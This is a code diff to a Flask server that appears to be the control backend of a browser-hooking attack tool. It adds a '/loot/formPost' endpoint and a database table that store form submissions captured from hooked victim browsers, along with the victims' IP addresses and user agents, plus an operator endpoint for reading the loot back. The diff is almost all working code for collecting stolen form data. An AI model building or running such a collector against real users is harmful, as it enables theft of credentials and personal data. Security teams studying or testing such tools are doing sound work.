@@ -449,6 +449,20 @@ class FetchCall(Base):
         return f'<FetchCall {self.id}>'
 
 
+class FormPost(Base):
+    __tablename__ = 'formpost'
+
+    id         = Column(Integer, primary_key=True)
+    clientID   = Column(String(100), nullable=False)
+    formAction = Column(String(100), nullable=False)
+    formMethod = Column(String(12), nullable=False)
+    formData   = Column(Text, nullable=True);
+    timeStamp  = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<FormPost {self.id}>'
+
+
 class Event(Base):
     __tablename__ = 'events'
 
@@ -780,6 +794,7 @@ try:
                     FetchHeader.__table__.drop(engine)
                     FetchCall.__table__.drop(engine)
                     Event.__table__.drop(engine)
+                    FormPost.__table__.drop(engine)
                     ClientPayloadJob.__table__.drop(engine)
                     dbCommit()
 
@@ -1578,6 +1593,43 @@ def recordFetchCall(identifier):
     return "ok", 200
 
 
+
+# Record Form Posts
+@app.route('/loot/formPost/<identifier>', methods=['POST'])
+def recordFormPost(identifier):
+
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    # logger.info("## Recording Form Post")
+    content    = request.json 
+    formAction = content['action'] # This is base64 encoded
+    formMethod = content['method']
+    formData   = content['data'] # Make sure this comes in base64 encoded
+
+    # Put it in the database
+    newFormPost = FormPost(clientID=identifier, formAction=formAction, formMethod=formMethod, formData=formData)
+    db_session.add(newFormPost)
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    dbCommit()
+
+    # add to global event table
+    db_session.refresh(newFormPost)
+    newEvent  = Event(clientID=identifier, timeStamp=newFormPost.timeStamp, 
+    eventType ='FORMPOST', eventID=newFormPost.id)
+    db_session.add(newEvent)
+    dbCommit()    
+
+    return "ok", 200
+
+
+
 #***************************************************************************
 # UI API Endpoints
 
@@ -1775,6 +1827,19 @@ def getClientFetchCall(key):
     fetchCallData = {'requestBody':fetchCall.requestBody, 'responseBody':fetchCall.responseBody}
 
     return jsonify(fetchCallData)
+
+
+
+@app.route('/api/clientFormPosts/<key>', methods=['GET'])
+@login_required
+def getClientFormPost(key):
+    #logger.info("*** Fetching client form post..")
+    formPost = FormPost.query.filter_by(id=key).first()
+
+    # formAction and data are base64 encoded at this point
+    formPostData = {'action':formPost.formAction, 'method':escape(formPost.formMethod), 'data': formPost.formData}
+
+    return jsonify(formPostData)
 
 
 
